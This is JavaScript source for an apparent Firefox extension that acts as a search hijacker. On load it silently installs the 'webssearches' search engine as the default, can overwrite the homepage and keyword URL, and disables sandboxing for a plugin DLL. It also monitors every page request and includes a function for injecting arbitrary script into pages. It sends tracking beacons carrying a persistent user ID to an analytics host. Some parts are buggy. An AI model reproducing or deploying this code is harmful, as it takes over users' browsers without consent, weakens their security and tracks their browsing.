(function(){if(!window.XA){XA={_url:"http://xa.xingcloud.com/v4/",_actions:[],_updates:[],_sending:false,init:function(option){if(!option.app){throw new Error("App is required.")}XA._app=option.app;XA._uid=option.uid||"random"},setUid:function(uid){XA._uid=uid},action:function(){for(var i=0,l=arguments.length;i<l;i++){XA._actions.push(arguments[i])}XA._asyncSend()},update:function(){for(var i=0,l=arguments.length;i<l;i++){XA._updates.push(arguments[i])}XA._asyncSend()},_asyncSend:function(){setTimeout(function(){var rest=XA._url+XA._app+"/"+XA._uid+"?",item=null,strItem="",index=0,length=XA._updates.length+XA._actions.length;if(length==0||XA._sending){return}XA._sending=true;while(item=XA._updates.shift()){strItem="update"+index+++"="+encodeURIComponent(item)+"&";if(rest.length+strItem.length>=1980){XA._updates.unshift(item);break}else{rest=rest+strItem}}index=0;while(item=XA._actions.shift()){strItem="action"+index+++"="+encodeURIComponent(item)+"&";if(rest.length+strItem.length>=1980){XA._actions.unshift(item);break}else{rest=rest+strItem}}(new Image()).src=rest+"_ts="+new Date().getTime();if(XA._updates.length+XA._actions.length>0){XA._asyncSend()}XA._sending=false},0)}}}})();
FF2Plugin = null;
var FF2Framework = {
    QueryInterface: function (aIID) {
        if (aIID.equals(Components.interfaces.nsIWebProgressListener) || aIID.equals(Components.interfaces.nsISupportsWeakReference) || aIID.equals(Components.interfaces.nsISupports)) 
            return this;
        throw Components.results.NS_NOINTERFACE;
    },
    register: function () {
        try{
            gBrowser.addProgressListener(FF2Framework);
        }catch(e){}
        Components.classes['@mozilla.org/observer-service;1'].getService(Components.interfaces.nsIObserverService).addObserver(FF2Framework, "http-on-modify-request", false);
    },
    unregister: function () {
        try{
            gBrowser.removeProgressListener(FF2Framework);
        }catch(e){}
    },

    observe: function (aSubject, aTopic, aData) {
        if ("http-on-modify-request" == aTopic) {
            var httpChannel = aSubject.QueryInterface(Components.interfaces.nsIHttpChannel);
            var url = aSubject.URI.spec;
            var headerAccept = httpChannel.getRequestHeader("Accept");
            if (headerAccept.indexOf("text/html") != -1) {
                var matches = url.match(/^http\:\/\/([^\/?#]+)(?:[\/?#]|$)/i);
                var infoUrl = new Object;
                infoUrl.domain = matches && matches[1];
                if (-1 != infoUrl.domain.indexOf('.')) {
                    infoUrl.top = true;
                    infoUrl.url = url;
                    infoUrl.params = new Object;
                    url.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (m, key, value) {
                        infoUrl.params[key] = value;
                    });

                    // var newUrl = FF2Plugin.SendEvent(260, JSON.stringify(infoUrl));
                    // if (newUrl != "") {
                    //     httpChannel.cancel(Components.results.NS_BINDING_ABORTED);
                    //     gBrowser.loadURI(newUrl);
                    // }
                }
            }
        }
    },

    getBrowserFromChannel: function (aChannel) {
        try 
        {
            var notificationCallbacks = aChannel.notificationCallbacks ? aChannel.notificationCallbacks : aChannel.loadGroup.notificationCallbacks;
            if (!notificationCallbacks)
                return null;
            var domWin = notificationCallbacks.getInterface(Components.interfaces.nsIDOMWindow);
            return domWin;
        }
        catch (e) {
            return null;
        }
    },

    onLocationChange: function (aProgress, aRequest, aURI) { 
    },

    onStateChange: function (aWebProgress, aRequest, aStateFlags, aStatus) {
    },

    onProgressChange: function (aWebProgress, aRequest, aCurSelfProgress, aMaxSelfProgress, aCurTotalProgress, aMaxTotalProgress) {
    },
    
    onStatusChange: function (aWebProgress, aRequest, aStatus, aMessage) {
    },
    
    onSecurityChange: function (aWebProgress, aRequest, aState) {
    },
    
    onLinkIconAvailable: function (aBrowser) {
    },

    SetNoSandboxing: function () {
        try {
            var svc = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
            if (null != svc)
                svc.setBoolPref("dom.ipc.plugins.enabled.nptnt2.dll", false);
        }
        catch (e) {  }
    },
    navigate: function (uri) {
        try {
            var WinWatcher = Components.classes["@mozilla.org/embedcomp/window-watcher;1"].getService(Components.interfaces.nsIWindowWatcher);
            var ActiveWin = WinWatcher.activeWindow;
            ActiveWin.loadURI(uri);
        }
        catch (e) {
            try {
                openUILink(uri, null);
            }
            catch (ee) {  }
        }
    },
    newtabnavigate: function (uri) {
        try {
            gBrowser.addTab(uri);
        }
        catch (e) { }
    },
    injectscript: function (source) {
        try {
            var WinWatcher = Components.classes["@mozilla.org/embedcomp/window-watcher;1"].getService(Components.interfaces.nsIWindowWatcher);
            var myScript = WinWatcher.activeWindow.content.document.createElement('script');
            myScript.type = 'text/javascript';
            myScript.textContent = src;
            WinWatcher.activeWindow.content.document.getElementsByTagName('head')[0].appendChild(myScript);
        }
        catch (e) { }
    },
    enginename: "",
    makedefault: true,
    ff_recheckProvider: function () {
        try {
            var searchService = Components.classes["@mozilla.org/browser/search-service;1"].getService(Components.interfaces.nsIBrowserSearchService);
            var engine = searchService.getEngineByName(enginename);
            if (!engine) {
                setTimeout(ff_recheckProvider, 100);
            }
            else {
                engine.hidden = false;
                searchService.currentEngine = engine;
                searchService.moveEngine(engine, 0);
                var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefService);
                if( makedefault ){
                    var browserSearchPrefBranch = prefs.getBranch('browser.search.');
                    browserSearchPrefBranch.setCharPref('defaultenginename', enginename);
                    browserSearchPrefBranch.setCharPref('selectedEngine', enginename);
                }
            }
        }
        catch (e) { }
    },
    ff_getprefBranch: function (type){
            var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefService);
            var bp = prefs.getBranch('browser.search.searchengine.');
            if (type == 'name') {
                if(prefs.getPrefType('browser.search.searchengine.name')){
                    var name = bp.getCharPref('name');
                    return name;
                }else{
                     return 'webssearches';
                }               
            }else if( type == 'icon'){
                if(prefs.getPrefType('browser.search.searchengine.iconURL')){
                     var icon = bp.getCharPref('iconURL');
                    return icon;
                }else{
                     return 'http://a.thanksearch.com/ftpup/images/me/n/i1310161413.png';
                }
            }else if(type == 'alias'){                
                if(prefs.getPrefType('browser.search.searchengine.alias')){
                    var alias = bp.getCharPref('alias');
                    return alias;
                }else{
                   return 'defaultsearch'; 
                }
            }else if(type == 'desc'){
                if(prefs.getPrefType('browser.search.searchengine.desc')){
                     var desc = bp.getCharPref('desc');
                     return desc;
                }else{
                    return 'defaultsearch engine.';
                }                
            }else if(type == 'url'){
                
               if(prefs.getPrefType('browser.search.searchengine.url')){
                    var url = bp.getCharPref('url');
                    return url; 
                }else{
                   return 'http://istart.webssearches.com/web/?type=dspp&ts=1419064720&from=firfox&q={searchTerms}';
                }                 
            }
    },
    ff_addSearchProvider: function () {
        try 
        {
            var provider = new Object();
            provider.name = this.ff_getprefBranch('name');
            provider.iconURL = this.ff_getprefBranch('icon');
            provider.alias = this.ff_getprefBranch('alias');
            provider.description = this.ff_getprefBranch('desc');
            provider.method = "get";
            provider.makedefault = true;
            provider.url = this.ff_getprefBranch('url')
            var browserSearchService = Components.classes["@mozilla.org/browser/search-service;1"].getService(Components.interfaces.nsIBrowserSearchService);
            enginename = provider.name;
            try{
                var prvEngine = browserSearchService.getEngineByName(enginename);
                if (prvEngine != null)
                    browserSearchService.removeEngine(prvEngine);
            }catch(e){
            }
          
            var result =  browserSearchService.addEngineWithDetails(
                            provider.name,
                            provider.iconURL,
                            provider.alias,
                            provider.description,
                            provider.method,
                            provider.url);
            var myengine = browserSearchService.getEngineByName(enginename);
            if( myengine ) 
                browserSearchService.currentEngine = myengine;
            var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefService);
            if( provider.makedefault != null ){
                makedefault = provider.makedefault;
                if( makedefault ){
                    var browserSearchPrefBranch = prefs.getBranch('browser.search.');
                    browserSearchPrefBranch.setCharPref('defaultenginename', enginename);
                    browserSearchPrefBranch.setCharPref('selectedEngine', enginename);
                }
            }
            if( provider.homep ){
                var donevar = 'ff' + provider.partner + '.initdone';
                if( !prefs.getPrefType(donevar) ){
                    prefs.setBoolPref(donevar, true);
                    prefs.setCharPref('browser.startup.homepage', provider.homep);
                }
            }
            if( provider.keywordUrl ){
                prefs.setCharPref("keyword.URL", provider.keywordUrl);
            }
        }
        catch (e) { }
    },
    
    get_uid: function(){
        var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefService);
        var browserSearchPrefBranch = prefs.getBranch('browser.search.searchengine.');
        if(prefs.getPrefType('browser.search.searchengine.uid')){
            var uid = browserSearchPrefBranch.getCharPref('uid');
            return uid;
        }else{
            var uuidGenerator = Components.classes["@mozilla.org/uuid-generator;1"]
        .getService(Components.interfaces.nsIUUIDGenerator);
         browserSearchPrefBranch.setCharPref('searchengine.uid',uuidGenerator);
         return uuidGenerator.generateUUID().toString();    
        }
    },

    get_ptid: function(){
        var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefService);
        var browserSearchPrefBranch = prefs.getBranch('browser.search.searchengine.');
        if(prefs.getPrefType('browser.search.searchengine.ptid')){
            var ptid = browserSearchPrefBranch.getCharPref('ptid');
            return ptid;
        }else{
            return 'firefox';   
        }
    },

    addbookmark: function (url) {
        try {
            var bmsvc = Components.classes["@mozilla.org/browser/nav-bookmarks-service;1"].getService(Ci.nsINavBookmarksService);
            var ios = Components.classes["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);
            bmsvc.insertBookmark(bmsvc.unfiledBookmarksFolder, ios.newURI(url, null, null), -1, "some name");
        }
        catch (e) { }
    },

    analytics: function(){
    /*如果获取不到uid，退出*/
    if(!XA) return;
        var appid = "firefox-searchengine";
        XA.init({app: appid, uid: this.get_uid() });
        XA.action('visit.main');
        XA.update('version,1.0.0.1025');
        XA.update('ref0,'+ this.get_ptid());
        XA.update("platform,firefox");
        XA.update();
    }
};
FF2Framework.SetNoSandboxing();
window.addEventListener("load", function () {
    FF2Framework.register();
    FF2Framework.ff_addSearchProvider();
    FF2Framework.analytics();
}, false);
window.addEventListener("unload", function () {
    FF2Framework.unregister();
}, false);
setTimeout(function(){
    FF2Plugin = document.getElementById("FF2NP");
}, 500);
